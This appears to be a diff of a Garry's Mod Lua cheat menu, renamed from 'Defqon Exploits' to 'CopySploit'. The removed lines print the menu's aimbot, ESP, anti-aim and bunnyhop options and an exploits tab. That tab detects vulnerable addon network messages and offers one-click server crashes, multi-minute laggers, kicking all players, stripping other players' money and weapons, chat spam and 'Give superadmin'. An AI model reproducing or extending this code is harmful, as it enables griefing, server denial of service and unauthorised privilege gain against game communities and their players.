@@ -3,38 +3,18 @@ local CCA = C.Add
 local prant = print
 prant( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
 MsgC (Color( 66, 61, 55 ), [[
-===========================================================================
-  ____        __                   ____        _       _ _     ____   ___
- |  _ \  ___ / _| __ _  ___  _ __ / ___| _ __ | | ___ (_) |_  | ___| / _ \
- | | | |/ _ \ |_ / _` |/ _ \| '_ \\___ \| '_ \| |/ _ \| | __| |___ \| | | |
- | |_| |  __/  _| (_| | (_) | | | |___) | |_) | | (_) | | |_   ___) | |_| |
- |____/ \___|_|  \__, |\___/|_| |_|____/| .__/|_|\___/|_|\__| |____(_)___/
-                    |_|                 |_|
-===========================================================================
-                                          `-.`'.-'
-                                       `-.        .-'.
-                                    `-.    -./\.-    .-'
-                                        -.  /_|\  .-
-                                    `-.   `/____\'   .-'.
-                                 `-.    -./.-""-.\.-      '
-                                    `-.  /< (()) >\  .-'
-                                  -   .`/__`-..-'__\'   .-
-                                ,...`-./___|____|___\.-'.,.
 
-      )\  / )               /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\             ( \  /(
-     / / ( (                |      Defqon Exploits  5.1.1      |              ) ) \ \
-    | |   \ \               |          |dev 17.03.18|          |             / /   | |
- .-.\ \    \ \              |            by Leith              |            / /    / /.-.
-(=  )\ `._.' |              |         discord.gg/weJb7TJ       |            | `._.' /(  =)
- \ (_)       )              | -------------------------------- |            (       (_) /
-  \    `----'               | Type Defqon in console to open!  |             '----`    /
-                            \ -------------------------------- /
-                             ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
-love you, спасибо за использование этого меню (-'_'-)
-==========================================================================================
-  ]])
+   _____                   _____       _       _ _   
+  / ____|                 / ____|     | |     (_) |  
+ | |     ___  _ __  _   _| (___  _ __ | | ___  _| |_ 
+ | |    / _ \| '_ \| | | |\___ \| '_ \| |/ _ \| | __|
+ | |___| (_) | |_) | |_| |____) | |_) | | (_) | | |_ 
+  \_____\___/| .__/ \__, |_____/| .__/|_|\___/|_|\__|
+             | |     __/ |      | |                  
+             |_|    |___/       |_|                  
+]])
 surface.PlaySound("garrysmod/content_downloaded.wav")
-------------------------------------------------------------------------Defqon MENU--------------------------------------------------------------------------------------
+------------------------------------------------------------------------CopySploit MENU--------------------------------------------------------------------------------------
 --[[ WATERMARK ]] --
 --[[Watermark = vgui.Create( "HTML" )
 Watermark:SetPos( -13, -8)
@@ -43,62 +23,7 @@ Watermark:OpenURL( "" )]]
 ----------------------------------------------
 Version = "+"
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-local AimbotPoints = {}
-AimbotPoints[1] = {bone = "ValveBiped.Bip01_Head1"}
-AimbotPoints[2] = {bone = "ValveBiped.Bip01_Neck1"}
-AimbotPoints[3] = {bone = "ValveBiped.Bip01_Spine4"}
-AimbotPoints[4] = {bone = "ValveBiped.Bip01_Spine2"}
-AimbotPoints[5] = {bone = "ValveBiped.Bip01_Spine"}
-surface.CreateFont( "Font L", {
-    font = "Courier New",
-    size = 18,
-    weight = 300,
-} )
-surface.CreateFont( "Font M", {
-    font = "Courier New",
-    size = 15,
-    weight = 300,
-} )
-surface.CreateFont( "Font L2", {
-    font = "Verdana",
-    extended = false,
-    size = 12,
-    weight = 1000,
-    blursize = 0,
-    scanlines = 0,
-    shadow = true,
-    antialias = true
-} )
--- if youre going to use this for your paste atleast give me credit :)
--- CFour - /id/BordersClosed/
-local pMenu = {}--functions
-local pMenuVars = {
-    Tabs = {},
-    Sliders = {},
-    CheckBoxes = {},
-    Exploits = {}
-} --// store values to be used at a later time
-local BigExploits = {}
-local PI = 3.14159265359;
-local Rad = 180 / PI
-function pMenu.IsNetString(netstring)
-    local validate,_ = pcall( net.Start, netstring )
-    if validate then
-        return validate;
-    end
-    return false;
-end
-function pMenu.RandomString(len)
-    if len == nil then
-        len = math.random(20,100)
-    end
-    local ret = ""
-    for i=1,len do
-        ret = ret..string.char(math.random(33,126)) --// fist 32 of ascii is pretty much garbage, I don't want spaces so we're skipping 32.
-    end                                             --// also I don't think gmod uses extended ascii
-    return ret
-end
-BigExploits["Мани с дуэли)"] = {func =
+--[[BigExploits["Мани с дуэли)"] = {func =
 function()
     if pMenu.IsNetString("duelrequestguiYes") then
         net.Start("duelrequestguiYes")
@@ -433,843 +358,7 @@ function()
     end)
 end
 }
-
-function pMenu.MouseInArea(frame,minx,miny,maxx,maxy)
-    local PosX,PosY = frame:GetPos()
-    local posx,posy = gui.MousePos();
-    return ((posx >= minx && posx <= maxx) && (posy >= miny && posy <= maxy));
-end
-function pMenu.DrawOutLinedRect(x,y,w,h,color)
-    surface.SetDrawColor( color )
-    surface.DrawOutlinedRect( x, y, w, h )
-    surface.SetDrawColor( Color(255,255,255,255) )
-end
-function pMenu.DrawRect(x,y,w,h,color)
-    surface.SetDrawColor( color )
-    surface.DrawRect( x, y, w, h )
-    surface.SetDrawColor( Color(255,255,255,255) )
-end
-function pMenu.Drawline(x,y,x2,y2,color)
-    surface.SetDrawColor(color)
-    surface.DrawLine(x,y,x2,y2)
-    surface.SetDrawColor( Color(255,255,255,255) )
-end
-function pMenu.DrawCircle(X,Y,radius,numSides,color)
-    local Step = PI * 2.0 / numSides;
-    local old = 0;
-    for a=0,PI*2.0,Step do
-        local X1 = radius * math.cos(a) + X;
-        local Y1 = radius * math.sin(a) + Y;
-        local X2 = radius * math.cos(a + Step) + X;
-        local Y2 = radius * math.sin(a + Step) + Y;
-        surface.SetDrawColor( color )
-        surface.DrawLine(X1, Y1, X2, Y2);
-    end
-end
-function pMenu.DrawSlider(frame,x,y,w,h,slider,min,max,startval,round)
-    if round == nil then
-        round = false;
-    end
-    max = max - min
-    if pMenuVars.Sliders[slider] == nil then
-        pMenuVars.Sliders[slider] = {min = min, max = max, value = startval}
-    end
-    local PosX,PosY = frame:GetPos()
-    local NewX,NewY = PosX + x,PosY + y
-    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
-    if input.IsMouseDown(MOUSE_LEFT) && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-        local MX,MY = gui.MousePos();
-        local MXF,MYF = MX - NewX + x,MY - NewY + y
-        if round == false then
-            pMenuVars.Sliders[slider].value = math.Clamp(math.Round((((MXF - x) / w) * max + min)),min,max + min)
-        else
-            pMenuVars.Sliders[slider].value = math.Clamp((((MXF - x) / w) * max + min),min,max + min)
-        end
-    end
-    local val = pMenuVars.Sliders[slider].value;
-    local slid = (w - 10) / (max) * (val - min)
-    pMenu.DrawRect(x + slid,y,10,h,Color(18,89,131,255))
-    draw.SimpleText(val,"Font M",x + (w/2),y + 2,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-    pMenu.DrawOutLinedRect(x,y, w , h , Color( 0,255,255, 200 ))
-end
-function pMenu.DrawCheckBox(frame,x,y,CBOX,defvalue,text)
-    local w,h = 20,20
-    if pMenuVars.CheckBoxes[CBOX] == nil then
-        pMenuVars.CheckBoxes[CBOX] = {value = defvalue,tez = 0}
-    end
-    local PosX,PosY = frame:GetPos()
-    local NewX,NewY = PosX + x,PosY + y
-    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
-    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
-    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.CheckBoxes[CBOX].value then
-        pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,59,101,255))
-    end
-    if input.IsMouseDown(MOUSE_LEFT) then
-        pMenuVars.CheckBoxes[CBOX].tez = pMenuVars.CheckBoxes[CBOX].tez + 1
-    else
-        pMenuVars.CheckBoxes[CBOX].tez = 0;
-    end
-    if pMenuVars.CheckBoxes[CBOX].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-        pMenuVars.CheckBoxes[CBOX].value = !pMenuVars.CheckBoxes[CBOX].value;
-    end
-    if pMenuVars.CheckBoxes[CBOX].value then
-        pMenu.DrawRect(x + 3,y + 3,w - 6,h - 6,Color(18,89,131,255))
-    end
-    draw.SimpleText(text,"Font M",x + w + 5,y + 2,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-end
-
-function pMenu.DrawTab(frame,x,y,w,h,NAME,defvalue)
-    if pMenuVars.Tabs[NAME] == nil then
-        pMenuVars.Tabs[NAME] = {value = defvalue,tez = 0}
-    end
-    local PosX,PosY = frame:GetPos()
-    local NewX,NewY = PosX + x,PosY + y
-    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
-    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) && !pMenuVars.Tabs[NAME].value then
-        pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
-    end
-    if input.IsMouseDown(MOUSE_LEFT) then
-        pMenuVars.Tabs[NAME].tez = pMenuVars.Tabs[NAME].tez + 1
-    else
-        pMenuVars.Tabs[NAME].tez = 0;
-    end
-    if pMenuVars.Tabs[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-        pMenuVars.Tabs[NAME].value = !pMenuVars.Tabs[NAME].value;
-    end
-    if pMenuVars.Tabs[NAME].value then
-        pMenu.DrawRect(x,y,w,h,Color(18,89,131,255))
-    end
-    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
-    draw.SimpleText(NAME,"Font L",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
-end
-function pMenu.DrawExploit(frame,x,y,w,h,NAME,func,text1,text2)
-    if pMenuVars.Exploits[NAME] == nil then
-        pMenuVars.Exploits[NAME] = {func = func,tez = 0}
-    end
-    local PosX,PosY = frame:GetPos()
-    local NewX,NewY = PosX + x,PosY + y
-    pMenu.DrawRect(x,y,w,h,Color(12,25,34,255))
-    if pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-        pMenu.DrawRect(x,y,w,h,Color(18,59,101,255))
-    end
-    if input.IsMouseDown(MOUSE_LEFT) then
-        pMenuVars.Exploits[NAME].tez = pMenuVars.Exploits[NAME].tez + 1
-    else
-        pMenuVars.Exploits[NAME].tez = 0;
-    end
-    if pMenuVars.Exploits[NAME].tez == 1 && pMenu.MouseInArea(frame,NewX,NewY,NewX+w,NewY+h) then
-        pMenuVars.Exploits[NAME].func();
-    end
-    pMenu.DrawOutLinedRect(x,y,w,h,Color(0,255,255,255))
-    if text2 == nil then
-        draw.SimpleText(text1,"Font M",x + w/2,y + h/2,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
-    else
-        draw.SimpleText(text1,"Font M",x + w/2,y + h/2 - 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
-        draw.SimpleText(text2,"Font M",x + w/2,y + h/2 + 8,Color(255,255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
-    end
-end
-local firsttime = true
-local Frame = NULL;
-
-
-
-
-function pMenu.Menu()
-    Frame = vgui.Create( "DFrame" )
-    Frame:SetTitle( "" )
-    Frame:SetSize( 700, 500 )
-    Frame:Center()
-    Frame:ShowCloseButton(false)
-    Frame:MakePopup()
-    Frame.Paint = function( self, w, h )
-        pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
-        pMenu.DrawRect(0, 0, w, 20, Color( 18,89,131, 255 ))
-        pMenu.DrawOutLinedRect(0, 0, w, 20, Color( 0,255,255, 200 ))
-        pMenu.DrawOutLinedRect(0, 0, w, h, Color( 0,255,255, 200 ))
-        pMenu.DrawRect(5, 25, 125, h - 30, Color( 18,89,131, 100 ))
-        pMenu.DrawOutLinedRect(5, 25, 125, h - 30, Color( 0,255,255, 200 ))
-        pMenu.DrawOutLinedRect(135, 25, w - 140, h - 30, Color( 0,255,255, 200 ))
-        draw.SimpleText("BIG MENU (Delete для открытия/закрытия меню)","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-        local Aimbot = "Aimbot";
-        local Visuals = "Visuals";
-        local b1gExploits = "Exploits"
-        local misc = "misc"
-        local hvh = "HvH"
-        pMenu.DrawTab(Frame,10,30,115,50,Aimbot,true)
-        pMenu.DrawTab(Frame,10,85,115,50,Visuals,true)
-        pMenu.DrawTab(Frame,10,140,115,50,b1gExploits,true)
-        pMenu.DrawTab(Frame,10,195,115,50,misc,true)
-        pMenu.DrawTab(Frame,10,250,115,50,hvh,true)
-        if pMenuVars.Tabs[Visuals].value then
-            pMenu.DrawCheckBox(Frame,170,55,"ESP",true,"Enable ESP")
-
-            pMenu.Drawline(160,95,350,95,Color(0,255,255,255))
-
-            pMenu.DrawCheckBox(Frame,150,115,"ESP Name",true,"Name")
-            pMenu.DrawCheckBox(Frame,150,145,"ESP BoundingBox",true,"Bounding Box")
-            pMenu.DrawCheckBox(Frame,150,175,"ESP HealthBar",true,"Health Bar")
-            pMenu.DrawCheckBox(Frame,150,205,"ESP Traceline",true,"Eye Traceline")
-            draw.SimpleText("Traceline Distance","Font M",150,237,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,150,265,210,20,"ESP Traceline Distance",25,  250,  71)
-            pMenu.DrawCheckBox(Frame,150,295,"ESP Position",false,"Position")
-            pMenu.DrawCheckBox(Frame,150,325,"ESP Angles",false,"Eye Angles")
-            pMenu.DrawCheckBox(Frame,150,355,"ESP Glow",false,"Glow")
-            pMenu.DrawCheckBox(Frame,150,385,"ESP Chams",false,"Chams")
-            pMenu.DrawCheckBox(Frame,150,415,"ESP XQZ",false,"XQZ")
-            pMenu.DrawCheckBox(Frame,150,445,"ESP WeaponCham",false,"Weapon Chams")
-
-
-            draw.SimpleText("Box Color","Font M",390,35,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("R","Font M",660,55,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,55,260,20,"ESP BoxColor.r",0,  255,  255)
-            draw.SimpleText("G","Font M",660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,80,260,20,"ESP BoxColor.g",0,  255,  0)
-            draw.SimpleText("B","Font M",660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,105,260,20,"ESP BoxColor.b",0,  255,  255)
-
-            draw.SimpleText("Text Color","Font M",390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("R","Font M",660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,150,260,20,"ESP TextColor.r",0,  255,  255)
-            draw.SimpleText("G","Font M",660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,175,260,20,"ESP TextColor.g",0,  255,  206)
-            draw.SimpleText("B","Font M",660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,200,260,20,"ESP TextColor.b",0,  255,  121)
-
-            draw.SimpleText("Chams Visible","Font M",390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("R","Font M",660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,250,260,20,"ESP ChamVisColor.r",0,  255,  10)
-            draw.SimpleText("G","Font M",660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,275,260,20,"ESP ChamVisColor.g",0,  255,  206)
-            draw.SimpleText("B","Font M",660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,300,260,20,"ESP ChamVisColor.b",0,  255,  4)
-
-            draw.SimpleText("Chams Non-Visible","Font M",390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("R","Font M",660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,350,260,20,"ESP ChamNVisColor.r",0,  255,  70)
-            draw.SimpleText("G","Font M",660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,375,260,20,"ESP ChamNVisColor.g",0,  255,  70)
-            draw.SimpleText("B","Font M",660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,390,400,260,20,"ESP ChamNVisColor.b",0,  255,  255)
-
-            pMenu.Drawline(375,30,375,490,Color(0,255,255,255))
-        end
-        if pMenuVars.Tabs[misc].value then
-            pMenu.DrawCheckBox(Frame,170,55,"MISC Thirdperson",false,"Enable ThirdPerson")
-            draw.SimpleText("Distance","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  300,  100)
-            pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",true,"Enable Bunnyhop")
-            pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",true,"Enable Autostrafe")
-            pMenu.DrawCheckBox(Frame,170,195,"MISC Text to speech is fucking aids",false,"Enable Text to Speech")
-        end
-        if pMenuVars.Tabs[b1gExploits].value then
-            if pMenu.IsNetString("duelrequestguiYes")then
-                pMenu.DrawExploit(Frame,140,30,170,50,"Duel Moniez",BigExploits["Duel Moniez"].func,"Dueling","Give b1g money")
-            end
-            if pMenu.IsNetString("drugseffect_remove") then
-                pMenu.DrawExploit(Frame,140,85,170,50,"Drugsmod remove all weapons?",BigExploits["Drugsmod remove all weapons?"].func,"Drugsmod","Strip all Weapons?")
-            end
-            if pMenu.IsNetString("drugs_money") then
-                pMenu.DrawExploit(Frame,140,140,170,50,"Drugsmod remove all money?",BigExploits["Drugsmod remove all money?"].func,"Drugsmod","Remove all money?")
-            end
-            if pMenu.IsNetString("drugs_ignite") then
-                pMenu.DrawExploit(Frame,140,195,170,50,"Drugsmod ignite all props?",BigExploits["Drugsmod ignite all props?"].func,"Drugsmod","ignite all props?")
-            end
-            if pMenu.IsNetString("drugs_text") then
-                pMenu.DrawExploit(Frame,140,250,170,50,"Drugsmod remove all props?",BigExploits["Drugsmod remove all props?"].func,"Drugsmod","Remove all props?")
-            end
-            if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
-                pMenu.DrawExploit(Frame,140,305,170,50,"TGN Advanced Money Printer Take Monie",BigExploits["TGN Advanced Money Printer Take Monie"].func,"TGN Advanced Printer","Take all money")
-            end
-            if pMenu.IsNetString("DL_Answering") then
-                pMenu.DrawExploit(Frame,140,360,170,50,"Logging thing Kick All players?",BigExploits["Logging thing Kick All players?"].func,"Logging thing","Kick all players")
-            end
-            if pMenu.IsNetString("SimplicityAC_aysent") then
-                pMenu.DrawExploit(Frame,140,415,170,50,"SimplicityAC Crash Server",BigExploits["SimplicityAC Crash Server"].func,"SimplicityAC","Crash Server")
-            end
-            if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
-                pMenu.DrawExploit(Frame,315,30,170,50,"Auzlex's Teleport System Lag",BigExploits["Auzlex's Teleport System Lag"].func,"Auzlex's Teleport System","Lag Server for 5 min")
-            end
-            if pMenu.IsNetString("CFRemoveGame") then
-                pMenu.DrawExploit(Frame,315,85,170,50,"Lagger 2",BigExploits["Lagger 2"].func,"Lagger 2 (5 min)")
-            end
-            if pMenu.IsNetString("CreateCase") then
-                pMenu.DrawExploit(Frame,315,140,170,50,"Lagger 3",BigExploits["Lagger 3"].func,"Lagger 3 (5 min)")
-            end
-            if pMenu.IsNetString("rprotect_terminal_settings") then
-                pMenu.DrawExploit(Frame,315,195,170,50,"Lagger 4",BigExploits["Lagger 4"].func,"Lagger 4 (5 min)")
-            end
-            if pMenu.IsNetString("StackGhost") then
-                pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 5",BigExploits["Lagger 5"].func,"Lagger 5 (5 min)")
-            end
-            if pMenu.IsNetString("JoinOrg") then
-                pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 6",BigExploits["Lagger 6"].func,"Lagger 6 (5 min)")
-            end
-            if pMenu.IsNetString("pac_submit") then
-                pMenu.DrawExploit(Frame,315,305,170,50,"Lagger 7",BigExploits["Lagger 7"].func,"Lagger 7 (5 min)")
-            end
-            if pMenu.IsNetString("pac_to_contraption") then
-                pMenu.DrawExploit(Frame,315,360,170,50,"PAC Crash Server old",BigExploits["PAC Crash Server old"].func,"PAC (patched on some)","Crash Server")
-            end
-            if pMenu.IsNetString("NLRKick") then
-                pMenu.DrawExploit(Frame,315,415,170,50,"NLRKick",BigExploits["NLRKick"].func,"NLR","Kick everyone (but you)")
-            end
-            if pMenu.IsNetString("steamid2") then
-                pMenu.DrawExploit(Frame,490,30,170,50,"Lagger 8",BigExploits["Lagger 8"].func,"Lagger 8 (5min)")
-            end
-            if pMenu.IsNetString("NDES_SelectedEmblem") then
-                pMenu.DrawExploit(Frame,490,85,170,50,"Lagger 9",BigExploits["Lagger 9"].func,"Lagger 9 (5min)")
-            end
-            if pMenu.IsNetString("join_disconnect") then
-                pMenu.DrawExploit(Frame,490,140,170,50,"Lagger 10",BigExploits["Lagger 10"].func,"Lagger 10 (5min)")
-            end
-            if pMenu.IsNetString("Morpheus.StaffTracker") then
-                pMenu.DrawExploit(Frame,490,195,170,50,"B1g Crasher",BigExploits["B1g Crasher"].func,"B1g Crasher")
-            end
-            if pMenu.IsNetString("pplay_deleterow") then
-                pMenu.DrawExploit(Frame,490,250,170,50,"Give superadmin",BigExploits["Give superadmin"].func,"Give superadmin")
-            end
-            pMenu.DrawExploit(Frame,490,305,170,50,"pm spam",BigExploits["pm spam"].func,"Spam")
-            pMenu.DrawExploit(Frame,490,360,170,50,"asay spam",BigExploits["asay spam"].func,"asay spam")
-            draw.SimpleText("Defqon pExploitcity ","Font L",140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-        end
-        if pMenuVars.Tabs[Aimbot].value then
-            pMenu.DrawCheckBox(Frame,170,55,"Aibmot Enable",false,"Enable")
-            draw.SimpleText("Aimbot FOV","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,105,490,20,"Aimbot FOV",1,  360,  10,true)
-
-            pMenu.DrawCheckBox(Frame,170,140,"Aibmot Smooth",false,"Smooth movement")
-            draw.SimpleText("Smooth amount","Font M",170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,190,225,20,"Aimbot Smooth AMT",1,  100,  5)
-
-            pMenu.DrawCheckBox(Frame,410,140,"Aibmot Show fov circle",false,"Aibmot FOV circle (sort of accurate)")
-            draw.SimpleText("Circle color","Font M",410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("R","Font M",645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,410,190,225,20,"Aimbot Circle.r",1,  255,  255)
-            draw.SimpleText("G","Font M",645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,410,215,225,20,"Aimbot Circle.g",1,  255,  255)
-            draw.SimpleText("B","Font M",645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,410,240,225,20,"Aimbot Circle.b",1,  255,  1)
-            draw.SimpleText("A","Font M",645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,410,265,225,20,"Aimbot Circle.a",1,  255,  255)--159
-
-            draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY) Default: Left Alt","Font M",170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,315,490,20,"Aimbot Key",1,  159,  81)
-
-            draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine","Font M",170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code","Font M",170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,385,490,20,"Aimbot Bone",1,  #AimbotPoints,  1)
-        end
-        if pMenuVars.Tabs[hvh].value then
-            pMenu.DrawCheckBox(Frame,170,55,"HvH Enable",false,"Enable")
-            pMenu.DrawCheckBox(Frame,170,100,"HvH Antiaim",false,"Enable AntiAim")
-            draw.SimpleText("Pitch Angle","Font M",170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  -180.05332,true)
-            draw.SimpleText("Yaw Angle","Font M",170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  -80,true)
-            draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 yaw + cam.y","Font M",170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-            pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  4)
-            if pMenuVars.Sliders["HvH Style"].value == 2 then
-                draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-                pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  235)
-            elseif pMenuVars.Sliders["HvH Style"].value == 3 then
-                draw.SimpleText("Random min/max","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-                pMenu.DrawSlider(Frame,380,275,200,20,"HvH randomY",1,  180,  45)
-            end
-
-            pMenu.DrawCheckBox(Frame,170,310,"HvH Autoshoot",false,"Autoshoot")
-            pMenu.DrawCheckBox(Frame,170,460,"HvH pList",false,"pList")
-        end
-        if firsttime then
-            pMenuVars.Tabs[Visuals].value = false;
-            pMenuVars.Tabs[misc].value = false;
-            pMenuVars.Tabs[b1gExploits].value = false;
-            pMenuVars.Tabs[Aimbot].value = false;
-            pMenuVars.Tabs[hvh].value = true;
-        end
-        firsttime = false;
-    end
-    local PList = vgui.Create( "DFrame" )
-    PList:SetTitle( "" )
-    PList:SetSize( 300, ScrH() )
-    PList:SetPos(0,0)
-    PList:ShowCloseButton(false)
-    PList:MakePopup()
-    PList.Paint = function( self, w, h )
-        if pMenuVars.CheckBoxes["HvH pList"] != nil && pMenuVars.CheckBoxes["HvH pList"].value then
-            if pMenuVars.Tabs["HvH"].value != nil && pMenuVars.Tabs["HvH"].value then
-                pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
-                draw.SimpleText("PList","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-                draw.SimpleText("dont shooting?","Font M",w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-                draw.SimpleText("User It! :)","Font M",w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-                local up = 20;
-                local add = 50
-                local k = 0;
-                for _,v in pairs(player.GetAll()) do
-                    k = k + 1;
-                    if v == LocalPlayer() then
-                        k = k -1
-                        continue;
-                    end
-                    pMenu.DrawOutLinedRect(10,up + (k * add),280,44,Color(255,255,255,255))
-                    pMenu.DrawRect(10,up + (k * add),280,44,Color(18,89,131,170))
-                    draw.SimpleText(v:Nick(),"Font M",12,up + (k * add) + 3,Color(0,255,255,255))
-
-                    draw.SimpleText("P:","Font M",175,up + (k * add) + 3,Color(0,255,255,255))
-                    pMenu.DrawSlider(PList,190,up + (k * add),100,22,v:SteamID().."Force Pitch",-180,  180,  0,true)
-                    draw.SimpleText("Y:","Font M",175,up + (k * add) + 24,Color(0,255,255,255))
-                    pMenu.DrawSlider(PList,190,up + (k * add)+22,100,22,v:SteamID().."Force Yaw",-180,  180,  0,true)
-
-                    pMenu.DrawCheckBox(PList,11,up + (k * add) + 23,v:SteamID().."Baim",false,"baim")
-                    pMenu.DrawCheckBox(PList,75,up + (k * add) + 23,v:SteamID().."Force Ang",false,"Force Ang")
-                end
-            end
-        end
-        if Frame == NULL then
-            self:Close()
-        end
-    end
-end
-
-function pMenu.boundingbox(ply)
-    local iBoxWidth = 26;
-    local iBoxHeight = 71;
-
-		if ply:LookupBone("ValveBiped.Bip01_Spine")==-1 then
-			return end
-    local pos = ply:GetBonePosition(ply:LookupBone("ValveBiped.Bip01_Spine"));
-    if (ply:Crouching()) then
-        pos = Vector(pos.x, pos.y, pos.z - 27);
-        iBoxHeight = 55;
-    else
-        pos = Vector(pos.x,pos.y,pos.z - 42.5);
-    end
-
-    local points = {
-        Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
-        Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ),
-        Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ),
-        Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
-        Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight),
